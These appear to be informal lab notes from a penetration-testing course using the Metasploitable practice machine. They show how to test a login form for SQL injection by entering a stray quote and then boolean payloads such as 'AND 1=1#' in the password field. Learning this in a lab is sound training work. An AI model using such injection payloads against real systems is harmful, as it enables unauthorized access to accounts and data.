# We aren't able to get into a database. So now we have to get into 
# This is fixed in the metasploitable video
# Now we are good to practice
# We know the username and don't know the password

# Example of breaking the system. Shows us diagnostic info.
test by adding a single "

# Now we are testing by what we found in the diagnostic info
we type the username
# When we do this the database will be using the following to attempt to log us in:
SELECT * FROM accounts WHERE username='james' AND password='111111'

# We try to get something by breaking the last quote mark
SELECT * FROM accounts WHERE username='james' AND password='111111' AND 1=2#'
# Try to see if vulnerable if it works this second way:
SELECT * FROM accounts WHERE username='james' AND password='111111' AND 1=1#'

# Now we know that this machine is exploitable if it logs us in
